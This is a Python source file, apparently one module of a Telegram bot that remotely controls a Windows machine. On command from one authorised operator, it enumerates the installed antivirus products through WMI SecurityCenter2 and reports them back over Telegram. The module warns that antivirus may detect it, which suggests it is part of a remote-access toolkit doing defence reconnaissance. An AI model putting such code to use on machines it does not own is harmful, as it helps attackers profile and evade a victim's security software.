##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram import types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import Command
import wmi
from lib.texts import TEXTS, user_languages

from config import ALLOWED_USER_ID 

def register_antivirus_handlers(dp):

    def get_confirm_kb(lang='en'):
        if lang == 'ru':
            buttons = [
                InlineKeyboardButton(text="Запустить", callback_data="antivirus_confirm"),
                InlineKeyboardButton(text="Отмена", callback_data="antivirus_cancel")
            ]
        else:
            buttons = [
                InlineKeyboardButton(text="Start", callback_data="antivirus_confirm"),
                InlineKeyboardButton(text="Cancel", callback_data="antivirus_cancel")
            ]
        return InlineKeyboardMarkup(inline_keyboard=[buttons])

    @dp.message(F.text.casefold().in_({"антивирус", "antivirus"}))
    @dp.message(Command("antivirus"))
    async def cmd_start(message: types.Message):
        user_id = message.from_user.id
        text = message.text.casefold()

        # Определяем язык по команде
        if text == "антивирус":
            lang = 'ru'
        else:
            lang = user_languages.get(user_id, 'en')

        texts = TEXTS[lang]

        if user_id != ALLOWED_USER_ID:
            await message.answer(texts["no_access"])
            return

        await message.answer(
            texts.get("antivirus_warning", "При сканировании возможна детекция антивирусами, используйте на свой страх и риск."),
            reply_markup=get_confirm_kb(lang)
        )

    @dp.callback_query(lambda c: c.data in ["antivirus_confirm", "antivirus_cancel"])
    async def process_antivirus_callback(callback: CallbackQuery):
        user_id = callback.from_user.id
        text = callback.message.text.casefold()

        # Определяем язык по последнему сообщению
        if "антивирус" in text:
            lang = 'ru'
        else:
            lang = user_languages.get(user_id, 'en')

        texts = TEXTS[lang]

        if user_id != ALLOWED_USER_ID:
            await callback.answer(texts["no_access"], show_alert=True)
            return

        if callback.data == "antivirus_confirm":
            try:
                c = wmi.WMI(namespace="root/SecurityCenter2")
                antivirus_products = c.AntiVirusProduct()
                if antivirus_products:
                    for product in antivirus_products:
                        await callback.message.answer(
                            texts.get("antivirus_found", "Установленные антивирусные программы: ") + product.displayName
                        )
                else:
                    await callback.message.answer(texts.get("antivirus_not_found", "Антивирусные программы не обнаружены."))
                await callback.answer(texts.get("antivirus_done", "Проверка завершена, root."))
            except Exception as e:
                await callback.message.answer(texts.get("antivirus_error", "Произошла ошибка при проверке антивирусов: {error}").format(error=e))
        else:
            await callback.answer(texts.get("antivirus_cancelled", "Отменено пользователем."))
            await callback.message.answer(texts.get("antivirus_cancel_msg", "Проверка антивирусов отменена."))
